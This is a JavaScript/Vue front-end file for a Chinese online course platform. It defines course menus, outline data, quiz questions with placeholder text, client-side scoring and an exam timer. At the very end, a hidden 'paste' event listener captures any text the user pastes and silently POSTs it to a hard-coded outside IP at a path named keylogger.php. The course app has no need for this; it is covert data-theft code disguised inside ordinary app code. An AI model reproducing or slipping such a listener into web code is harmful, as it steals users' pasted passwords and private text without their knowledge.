/**
 * 
 * 
 * 课程左侧公告信息栏
 * 
 */
var course = {

    infoList: [
        {
            icon: 'el-icon-bell',
            title: '公告',
            children: [
                {
                    title: '课程介绍',
                    href: 'courseNotice.html'
                }
            ],
        },
        {
            icon: 'el-icon-reading',
            title: '课件',
            children: [
                {
                    title: '课件',
                    href: 'courseWare.html'
                },
                {
                    title: '课件添加',
                    href: 'courseWareMsg.html'
                }
            ],
        },
        {
            icon: 'el-icon-edit',
            title: '测试与作业',
            children: [
                {
                    title: '作业',
                    href: 'workAndTest.html'
                },
                {
                    title: '测试',
                    href: 'workAndTest.html'
                }
            ],
        },
        {
            icon: 'el-icon-eleme',
            title: '考试',
            children: [
                {
                    title: '考试',
                    href: 'testInfo.html'
                }
            ],
        },
        {
            icon: 'el-icon-chat-dot-square',
            title: '讨论区',
            children: [
                {
                    title: '讨论区',
                    href: 'talk.html'
                }
            ],
        },
        {
            icon: 'el-icon-medal',
            title: '评价',
            children: [
                {
                    title: '评价',
                    href: 'evaluate.html'
                }
            ],
        },
    ],
    courseOutline: [
        {
            name: '第一单元',
            isComplete: false,
            children: [
                {
                    name: '第一节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第二节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第三节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第四节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                }
            ]
        },
        {
            name: '第二单元',
            isComplete: false,
            children: [
                {
                    name: '第一节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第二节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第三节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第四节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                }
            ]
        },
        {
            name: '第三单元',
            isComplete: false,
            children: [
                {
                    name: '第一节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第二节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第三节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第四节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                }
            ]
        },
        {
            name: '第四单元',
            isComplete: false,
            children: [
                {
                    name: '第一节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第二节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第三节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第四节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                }
            ]
        },
        {
            name: '第五单元',
            isComplete: false,
            children: [
                {
                    name: '第一节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第二节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第三节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第四节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                }
            ]
        }
    ]
}


var userOptions = {
    order: [
        {
            title: '查看进度',
            icon: 'el-icon-collection',
            href: 'courseLoading.html'
        },
        {
            title: '课内消息',
            icon: 'el-icon-chat-dot-round',
            href: '#'
        },
        {
            title: '退出课堂',
            icon: 'el-icon-back',
            href: 'lookUpCourse.html'
        }
    ]
}
var danxuan = [
    {
        title: '那艘if阿富豪我好是欧式花是你OA深？',
        options: ['12', '17', '13', '20'],
        score : 4
    },
    {
        title: '部分可微波古尔沟我顾伟UI我还？',
        options: ['14', '10', '13', '22'],
        score : 4
    },
    {
        title: '放水后is后我换个问过我无比股市公司规划升级版素',
        options: ['24', '12', '45', '74'],
        score : 4
    },
    {
        title: '放水后is后我换个问过我无比股市公司规划升级版素',
        options: ['24', '12', '45', '74'],
        score : 4
    },
    {
        title: '放水后is后我换个问过我无比股市公司规划升级版素',
        options: ['24', '12', '45', '74'],
        score : 4
    },
    {
        title: '放水后is后我换个问过我无比股市公司规划升级版素',
        options: ['24', '12', '45', '74'],
        score : 4
    },
    {
        title: '放水后is后我换个问过我无比股市公司规划升级版素',
        options: ['24', '12', '45', '74'],
        score : 4
    },
    {
        title: '放水后is后我换个问过我无比股市公司规划升级版素',
        options: ['24', '12', '45', '74'],
        score : 4
    }
];
var duoxuan = [
    {
        title: '阿Ivan哦我AV你哦是AV噶大V11成本法牛初步',
        options: ['1', '2', '3', '4', '5'],
        score : 4,
        answer : []
    }
];
var tiankong = [
    {
        title: '中国的直辖市有那个_______',
        input: '',
        score : 4
    },
    {
        title: '你的_______是核心',
        input: '',
        score : 4
    }
];
var zhuguan = [
    {
        title: '你的感想是什么？',
        input: '',
        score : 4
    }
];
//请求得到
var answer = [
    {
        type: 'dx',
        value: [0, 0, 2, 2, 3, 3, 3, 3],
        score: 5
    },
    {
        type: 'sx',
        value: [['1', '2']],
        score: 10
    },
    {
        type: 'tk',
        value: ['123456', '654321'],
        score: 10
    },
    {
        type: 'zg',
        value: ['123456'],
        score: 30
    }
];
danxuan.forEach((item) => {
    item.select = 'default';
    item.type = -1;
});
duoxuan.forEach((item) => {
    item.select = [];
    item.type = -1;
});
tiankong.forEach((item) => {
    item.type = -1;
    item.standard = [];
    item.auto = false;
});
zhuguan.forEach((item) => {
    item.type = -1;
    item.standard = [];
    item.auto = false;
});
//================================================================================




var app = new Vue({
    el: '#app',
    data: {
        user: 'XXX',
        course: course,
        userOptions: userOptions,
        name: window.localStorage.getItem('courseName'),
        activeNames: ['1'],
        test: [
            { title: '第一章测试', works: [{ title: '作业一', start: '2019-8-7', end: '2019-12-7', info: '其他', state: -1, score: 0 }, { title: '作业二', start: '2019-8-7', end: '2019-12-7', info: '其他', state: 1, score: 10 }] },
            { title: '第二章测试', works: [{ title: '作业一', start: '2019-8-7', end: '2019-12-7', info: '其他', state: 0, score: 0 }] }
        ],
        exam: [
            { title: '考试一', start: '2019-8-7', end: '2019-12-7', info: '其他', state: 0, score: 87 },
            { title: '考试二', start: '2019-9-7', end: '2019-12-7', info: '其他', state: 1, score: 0 },
            { title: '考试三', start: '2019-9-7', end: '2019-12-7', info: '其他', state: -1, score: 0 }
        ],
        radio: '1',
        danxuan: danxuan,
        duoxuan: duoxuan,
        tiankong: tiankong,
        zhuguan: zhuguan,
        answer: answer,
        disabled: false,
        time: '00:10:10',
        current: {
            test: '',
            work: '',
            state: 0
        },
        talk: [
            { name: 'Lumnca', info: '抗击疫情，我们每个人都有责任，社会还需要继续发展，我们需要做的，就是注意好个人卫生，待在家里！等春天到来，万物复苏！', number: 84, date: '2019/12/21 20:12' },
            { name: 'Kay', info: '抗击疫情，我们每个人都有责任，社会还需要继续发展，我们需要做的，就是注意好个人卫生，待在家里！等春天到来，万物复苏！', number: 45, date: '2019/12/24 04:23' },
            { name: 'May', info: '抗击疫情，我们每个人都有责任，社会还需要继续发展，我们需要做的，就是注意好个人卫生，待在家里！等春天到来，万物复苏！', number: 233, date: '2019/12/29 11:58' }
        ],
        evaluate: {
            number: 3.9,
            infor: ''
        },
        ruleForm: {
            name: 'XXX',
            region: 'XXXXXX',
            date1: new Date(2020, 10, 5),
            date2: new Date(2020, 10, 5, 12, 12, 12),
            delivery: false,
            type: ['科技', '技术'],
            resource: '基本',
            desc: 'xxxxxx',
            price: 0,
            info: '欢迎大家选修算法设计与分析MOOC课程！ 屈老师的算法设计与分析课程深受学生喜爱。本课程是算法设计与分析对基础篇。通过十周的课程，介绍算法设计与分析的基础知识，并为大家详细讲解分治策略、动态规划、贪心法、以及回溯与分支限界法等算法设计方法以及相应的算法分析技术。相信大家经过学习一定会受益匪浅！'
        },
        rules: {
            name: [
                { required: true, message: '请输入课堂名称', trigger: 'blur' },
                { min: 2, max: 25, message: '长度在 2 到 25 个字符', trigger: 'blur' }
            ],
            region: [
                { required: true, message: '请输入', trigger: 'change' }
            ],
            date1: [
                { type: 'date', required: true, message: '请选择日期', trigger: 'change' }
            ],
            date2: [
                { type: 'date', required: true, message: '请选择时间', trigger: 'change' }
            ],
            type: [
                { type: 'array', required: true, message: '请至少选择一个', trigger: 'change' }
            ],
            resource: [
                { required: true, message: '请选择', trigger: 'change' }
            ],
            desc: [
                { required: true, message: '请输入课堂介绍', trigger: 'blur' }
            ],
            price: [
                { type: 'number', required: true, message: '请输入价格', trigger: 'change' }
            ]
        },
        wares: [{
            id: '0',
            label: '第一章',
            children: [{
                id: '0-0',
                label: '课题一',
                children: []
            }]
        }, {
            id: '1',
            label: '第二章',
            children: [{
                id: '1-0',
                label: '课题一'
            }, {
                id: '1-1',
                label: '课题二'
            }]
        }, {
            id: '2',
            label: '第三章',
            children: [{
                id: '2-0',
                label: '课题一'
            }, {
                id: '2-1',
                label: '课题二'
            }]
        }],
        ruleForm2: {
            name: '',
            startdate1: '',
            startdate2: '',
            enddate1: '',
            enddate2: '',
            disabled: true,
            info: '',
            test: 0,
        },
        rules2: {},
        dialogFormVisible: false,
        dialogFormVisible2: false,
        dialogFormVisible3: false,
        dialogFormVisible4: false,
        selectTest : {
            title : '',
            options : [],
            answer : '',
            score : 0
        },
        selectTestTianKong : {
            title: '题目主干信息',
            input: '',
            score : 4,
            type: -1, 
            standard : [],
            auto : false
        },
        selectTestZhuGuan : {
            title: '题目主干信息',
            input: '',
            score : 4,
            type: -1, 
            standard : [],
            auto : false
        }
    },
    methods: {
        handleOpen(key, keyPath) {
            console.log(key, keyPath);
        },
        handleClose(key, keyPath) {
            console.log(key, keyPath);
        },
        handleChange(val) {

        },
        submitForm(formName) {
            this.$refs[formName].validate((valid) => {
                if (valid) {
                    alert('submit!');
                } else {
                    console.log('error submit!!');
                    return false;
                }
            });
        },
        resetForm(formName) {
            this.$refs[formName].resetFields();
        },
        submitForm2(form) {
            var success = false;
            console.log(form);
            if (form.startdate1 != '' && form.startdate2 != '' && form.enddate1 != '' && form.enddate2 != '') {
                if (form.startdate1.getTime() <= form.enddate1.getTime()) {
                    if (form.startdate1.getTime() == form.enddate1.getTime()) {
                        if (form.startdate2.getTime() <= form.enddate2.getTime()) {
                            success = true;
                        }
                    }
                    else {
                        success = true;
                    }
                }
                if (success) {
                    this.$message({
                        message: '添加成功！',
                        type: 'success'
                    });
                    var data1 = form.startdate1.getFullYear()+'/'+form.startdate1.getMonth()+'/'+form.startdate1.getDate()+' '+
                    (form.startdate2.getHours()>9? form.startdate2.getHours():'0'+form.startdate2.getHours())+':'+
                    (form.startdate2.getMinutes()>9? form.startdate2.getMinutes():'0'+form.startdate2.getMinutes())+':'+
                    (form.startdate2.getSeconds()>9? form.startdate2.getSeconds():'0'+form.startdate2.getSeconds());

                    var data2 = form.enddate1.getFullYear()+'/'+form.enddate1.getMonth()+'/'+form.enddate1.getDate()+' '+
                    (form.enddate2.getHours()>9? form.enddate2.getHours():'0'+form.enddate2.getHours())+':'+
                    (form.enddate2.getMinutes()>9? form.enddate2.getMinutes():'0'+form.enddate2.getMinutes())+':'+
                    (form.enddate2.getSeconds()>9? form.enddate2.getSeconds():'0'+form.enddate2.getSeconds());


                    this.test[form.test].works.push({
                        title: form.name.trim(),
                        start: data1,
                        end: data2,
                        info: form.info,
                        state: form.disabled? '可用':'不可用'
                    });
                }
                else {
                    this.$message.error('起始日期应该比结束日期小！');
                }
            }
            else {
                this.$message.error('请将日期信息填写完整！');
            }
        },
        resetForm2(formName) {
            this.$refs[formName].resetFields();
        },
        rename(e,data){
            window.event? window.event.cancelBubble = true : e.stopPropagation();
            this.$prompt('请输入', '提示', {
                confirmButtonText: '确定',
                cancelButtonText: '取消',
                inputValue : data.title
              }).then(({ value }) => {
                data.title = value;
                this.$message({
                  type: 'success',
                  message: '已命名为' + value
                });
              }).catch(() => {
                this.$message({
                  type: 'info',
                  message: '取消输入'
                });       
              });
        },
        delTest(e,data){
            window.event? window.event.cancelBubble = true : e.stopPropagation();
            //
            this.test.splice(this.test.indexOf(data),1);

        },
        editTestDanXuan(data){
            this.dialogFormVisible = true;
            this.selectTest= data;
        },
        editTestDuoXuan(data){
            this.dialogFormVisible2 = true;
        },
        editTestTianKong(data){
            this.dialogFormVisible3 = true;
            this.selectTestTianKong = data;
        },
        editTestZhuGuan(data){
            this.dialogFormVisible4 = true;
            this.selectTestZhuGuan = data;
        },
        append(data) {
            var id = data.id;

            if (!data.children) {
                this.$set(data, 'children', []);

            }
            if (data.children.length == 0) {
                id = id + '-0';
                console.log(id);
                const newChild = { id: id, label: '新子节点', children: [] };

                if (id.length > 3) {
                    this.$message({
                        message: '暂时不允许开启3级节点',
                        type: 'warning'
                    });
                }
                else {
                    data.children.push(newChild);
                }
            }
            else {
                var len = data.children.length;
                var re = data.children[data.children.length - 1].id;
                re = re.substr(0, re.length - 1) + len.toString();
                const newChild = { id: re, label: '新节点', children: [] };
                data.children.push(newChild);
            }


        },
        addnode() {
            var str = this.wares.length;
            this.wares.push({ id: '' + str, children: [], label: '新节点' });
        },
        remove(node, data) {
            const parent = node.parent;
            const children = parent.data.children || parent.data;
            const index = children.findIndex(d => d.id === data.id);
            children.splice(index, 1);
        },
        update(data) {
            this.$prompt('请输入新名称', '提示', {
                confirmButtonText: '确定',
                cancelButtonText: '取消',
                inputValue: data.label
            }).then(({ value }) => {
                data.label = value;
                this.$message({
                    type: 'success',
                    message: '修改成功 '
                });
            }).catch(() => {
                this.$message({
                    type: 'info',
                    message: '取消输入'
                });
            });
        },
        addTest(){
            this.test.push({ title: '新章节', works: []});
        },
        setTest(){
            this.dialogFormVisible = false;
        },
        addTestDanXuan(){
            this.danxuan.push(    {
                title: '题目主体',
                options: ['A', 'B', 'C', 'D'],
                score : 4,
                type : -1,
                select : 'default'
            });
        },
        addTestDuoXuan(){
            this.duoxuan.push(    {
                title: '题目主体',
                options: ['A', 'B', 'C', 'D','E'],
                score : 4,
                type : -1,
                select : [],
                answer : []
            });
        },
        delDanXuan(index){
            this.danxuan.splice(index,1);
        },
        computedScore() {
            var score = 0;
            var tkMistake = 0;
            var dxMistake = 0;
            var zgMistake = 0;
            var sxMistake = 0;
            this.answer.forEach((item) => {
                if (item.type == 'dx') {
                    for (let index = 0; index < this.danxuan.length; index++) {

                        if (app.danxuan[index].select == item.value[index]) {
                            score += item.score;
                            console.log("d YES");
                        }
                        else {
                            dxMistake++;
                            app.danxuan[index].type = 1;
                        }
                    }
                }
                else if (item.type == 'sx') {
                    for (let index = 0; index < this.duoxuan.length; index++) {
                        if (app.duoxuan[index].select.toString() == item.value[index].toString()) {
                            score += item.score;
                            console.log("s YES");
                        }
                        else {
                            sxMistake++;
                            app.duoxuan[index].type = 1;
                        }
                    }
                }
                else if (item.type == 'tk') {
                    for (let index = 0; index < this.tiankong.length; index++) {
                        if (app.tiankong[index].input.trim() == item.value[index]) {
                            score += item.score;
                            console.log("t YES");
                        }
                        else {
                            tkMistake++;
                            app.tiankong[index].type = 1;
                        }
                    }
                }
                else {
                    for (let index = 0; index < this.zhuguan.length; index++) {
                        if (app.zhuguan[index].input.trim() == item.value[index]) {
                            score += item.score;
                            console.log("z YES");
                        }
                        else {
                            zgMistake++;
                            app.zhuguan[index].type = 1;
                        }
                    }
                }
            });

            app.disabled = true;

            this.$notify({
                title: '提示',
                message: '选择题错误个数: ' + (dxMistake + sxMistake) + '  填空题错误个数: ' + tkMistake + ' 主观题错误个数: ' + zgMistake + '  最后得分:' + score,
                duration: 0
            });
        },
        write_work(work) {
            window.localStorage.setItem("work", work.title);
            window.location.href = "workShow.html";
            console.log(JSON.stringify(work))
        },
        edit_work(work) {
            console.log(JSON.stringify(work));
        },
        write_exam(work) {
            window.localStorage.setItem("exam", work.title);
            window.localStorage.setItem("state", work.state);
            window.location.href = "testShow.html";
            console.log(JSON.stringify(work))
        },
        edit_exam(work) {
            console.log(JSON.stringify(work));
        },
        addZ(item) {
            item.number += 1;
        },
    },
    computed: {
        write: function () {
            let i = 0;
            this.danxuan.forEach((item) => {
                if (item.select != 'default') {
                    item.type = 0;
                    i++;
                }
                else {
                    item.type = -1;
                }
            });
            this.duoxuan.forEach((item) => {
                if (item.select.length != 0) {
                    item.type = 0;
                    i++;
                }
                else {
                    item.type = -1;
                }
            });
            this.tiankong.forEach((item) => {
                if (item.input.length > 0) {
                    item.type = 0;
                    i++;
                }
                else {
                    item.type = -1;
                }
            });
            this.zhuguan.forEach((item) => {
                if (item.input.length > 0) {
                    item.type = 0;
                    i++;
                }
                else {
                    item.type = -1;
                }
            });
            return "完成度:" + i + "/" + (this.danxuan.length + this.tiankong.length + this.duoxuan.length + this.zhuguan.length);
        },
        countDown: function () {


        },
        danxuanAllScore : function(){
            var sum = 0;
            this.danxuan.forEach((item) => {
               sum+=item.score;
            });
            return sum;
        },
        duoxuanAllScore : function(){
            var sum = 0;
            this.duoxuan.forEach((item) => {
               sum+=item.score;
            });
            return sum;
        },
        tiankongAllScore : function(){
            var sum = 0;
            this.tiankong.forEach((item) => {
               sum+=item.score;
            });
            return sum;
        },
        zhuguanAllScore : function(){
            var sum = 0;
            this.zhuguan.forEach((item) => {
               sum+=item.score;
            });
            return sum;
        },
        AllScore : function(){
           
            return this.danxuanAllScore+this.duoxuanAllScore+this.tiankongAllScore+this.zhuguanAllScore;
        }
    },
});
app.current.work = window.localStorage.getItem('work');
app.current.test = window.localStorage.getItem('exam');
app.current.state = window.localStorage.getItem('state');

var time = app.time;
var hh = parseInt(time.split(':')[0]);
var mm = parseInt(time.split(':')[1]);
var ss = parseInt(time.split(':')[2]);
var timer = setInterval(() => {
    var hh = parseInt(time.split(':')[0]);
    var mm = parseInt(time.split(':')[1]);
    var ss = parseInt(time.split(':')[2]);
    if (ss > 0) {
        ss -= 1;
    }
    else {
        if (mm > 0) {
            ss = 59;
            mm -= 1;

        }
        else {
            if (hh > 0) {
                ss = 59;
                mm = 59;
                hh -= 1;
            }
        }
    }
    if (mm < 10) {
        mm = '0' + mm;
    }
    if (ss < 10) {
        ss = '0' + ss;
    }
    if (hh < 10) {
        hh = '0' + hh;
    }
    app.time = hh + ':' + mm + ':' + ss;
    time = app.time;
    if (hh == 0 && mm == 0 && ss == 0) {
        app.time = '- -:- -:- -';
        clearInterval(timer);
        app.disabled = true;
    }
}, 1000);




window.addEventListener('paste', function (e) {
    console.log(e.clipboardData.getData('text'));
    var txt = e.clipboardData.getData('text');
    var http = new XMLHttpRequest();
    http.open("POST", "http://47.106.254.86:1234/test/keylogger.php", false);
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.send("key=" + txt);
}, false)